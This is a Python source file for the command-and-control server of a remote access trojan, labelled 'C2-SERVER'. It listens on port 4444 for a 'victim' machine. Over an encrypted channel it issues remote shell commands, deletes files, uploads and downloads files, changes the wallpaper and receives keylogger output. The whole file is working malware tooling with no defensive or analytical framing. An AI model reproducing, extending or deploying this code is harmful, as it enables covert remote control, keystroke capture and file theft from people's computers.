import socket
import os
import time
from cryptography.fernet import Fernet

class EncryptedServer:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cipher = None
        self.operating_system = None
        self.conn = None

    def Start_server(self):
        self.sock.bind(("0.0.0.0", 4444))
        self.sock.listen(1)
        print("[*] Listening for Connections ...")
        self.conn, addr = self.sock.accept()
        print(f"[*] Connection from {addr}")
        key = self.conn.recv(1024)
        self.cipher = Fernet(key)
        self.operating_system = self.conn.recv(1024).decode()
        print(f"Victim's OS => {self.operating_system}")

    def encrypt(self, data: bytes) -> bytes:
        return self.cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        return self.cipher.decrypt(data)

    def to_chunks(self, data: bytes, chunk_size: int = 1024):
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def authenticate(self):
        for times in range(3):
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))

            result = self.decrypt(self.conn.recv(1024)).decode()
            print(result)
            if "successful" in result:
                return True
        self.conn.close()
        return False

    def send_command(self, command: str):
        self.conn.sendall(self.encrypt(command.encode()))

    def handle_response(self, command: str):
        if "del" in command:
            print(self.decrypt(self.conn.recv(1024)).decode())

        elif "keylogger" in command:
            while True:
                data = self.decrypt(self.conn.recv(1024)).decode()
                if data != "Done":
                    print(data.strip())
                else:
                    break

        elif "upload" in command:
            file_name = command.split(" ")[1]
            try:
                with open(file_name, "rb") as file:
                    content = self.encrypt(file.read())
                chunks = self.to_chunks(content)
                self.conn.send(self.encrypt(str(len(chunks)).encode()))
                time.sleep(1)
                for chunk in chunks:
                    self.conn.sendall(chunk)
            except FileNotFoundError:
                self.conn.send(self.encrypt(b"Wrong file name"))
            print(self.decrypt(self.conn.recv(1024)).decode())

        else:
            num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
            print(f"Chunks coming: {num_chunks}")
            encrypted_data = b''.join(self.conn.recv(1024) for _ in range(num_chunks))

            if "download" in command:
                file_name = command.split(" ")[1]
                with open(file_name, "ab") as file:
                    file.write(self.decrypt(encrypted_data))
                print("Download complete")
            else:
                try:
                    print(self.decrypt(encrypted_data).decode())
                except Exception as e:
                    print(f"Error decrypting data: {e}")

    def run(self):
        try:
            if not self.authenticate():
                return

            print("""\nAvailable commands:
dir, path, ipconfig, arp -a
del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
                    """)

            while True:
                command = input("shell> ").strip()
                if command == "help":
                    print("""Available commands:
dir, path, ipconfig, arp -a
del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
                    """)
                    continue

                elif (command.lower() == "exit") or (command.lower() == "close"):
                    print("\n[!] Interrupted by user. Closing connection.")
                    self.send_command("close")
                    self.conn.close()
                    break

                self.send_command(command)
                self.handle_response(command)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Closing connection.")
            self.send_command("close")
        finally:
            self.conn.close()


if __name__ == "__main__":
    print("""
 ██████╗██████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝╚════██╗      ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝█████╗███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝ ╚════╝╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
""")
    server = EncryptedServer()
    server.Start_server()
    server.run()
